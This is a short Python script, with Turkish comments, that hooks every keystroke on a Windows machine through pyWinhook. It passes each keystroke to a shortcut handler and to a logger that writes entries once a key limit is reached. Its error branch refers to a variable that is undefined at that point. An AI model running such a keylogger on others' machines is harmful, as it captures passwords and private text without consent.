#!/usr/bin/python
# -*- coding: utf-8 -*-

######################################################
#      PAKETLERI KONTROL ETME VE ÖNERİDE BULUNMA      
######################################################

try:
    from pyWinhook import HookManager, __file__ as pyWinhookFile
    from pygame import init
    from pygame.event import pump
    from utils import yLogger, yShortcutHandler, yDebugger
    from utils.yConfig import KEY_LIMIT

except ImportError as ext:
    from os.path import join as pathJoin

    dllpath = pathJoin(pyWinhookFile, "..", "..", "pywin32_system32")
    print("\n", ext)
    print(" DLL dosyaları koypalanmalı!")
    print()
    print("     DLL dosyalarının dizini: ")
    print(f"         {dllpath}")
    print()
    print("     Kopyalanacağı dizin:")
    print("         C:\\Windows\\System32")

    quit()

def OnKeyboardEvent(event):
    yShortcutHandler.handleShortcutPressed(event)
    yLogger.regData(event)
    yLogger.logOnReach(KEY_LIMIT)

    return True

def pumpMessage():
    init()
    while True:
        pump()

yDebugger.setLogLvl(2)
hooks_manager = HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pumpMessage()
